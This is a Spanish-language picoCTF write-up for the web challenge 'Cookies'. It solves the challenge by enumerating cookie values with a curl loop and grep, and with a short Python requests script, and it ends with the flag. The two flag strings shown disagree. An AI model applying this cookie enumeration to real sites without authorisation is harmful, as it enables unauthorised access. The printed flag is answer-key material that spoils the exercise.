#Software #Hacking #WebExplotation #Web #Internet 
# Definición
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
# Hints
(None)
# Solución
Al entrar vemos que no sabemos cuál cookie necesitamos, por lo que vemos a donde nos redirige que una cookie valida (usando [[CURL]]).
```bash
C:\Users\52492>curl http://mercury.picoctf.net:29649/check -H "Cookie: name=1"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->


        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>



        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>

</html>****
```

Pero vemos que no la encontramos, por lo cual intentamos en otras cookies, pero no la encontramos, por lo que establecemos un for para encontrar la bandera, y nos apoyamos de grep para acceder a un elemento en específico.

```bash
for i in {1..20}; do curl sS http://mercury.picoctf.net:21485/check -H "Cookie: name =$i"; done | grep picoCTF](<AsumomezaC-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name =$i"; done | grep picoCTF
            %3Cp style="text-align:center; font-size:30px;"%3E<b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>>)
```

Y así obtenemos la bandera.
### Con [[python]]
Puedes crear también un script en python para crear buscar la bandera.
```python
import requests
import re

url = "http://mercury.picoctf.net:21485/check"

for i in range(20):
        cookies = {'name':'{}'.format(i)}
        #print(cookies)
        r = requests.get(url, cookies=cookies)
        if 'picoCTF' in r.text:
                #print(r.text)
                flag = re.findall('picoCTF{.*?}',r.text)[0]
                print(flag)>)
```
## Respuesta
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}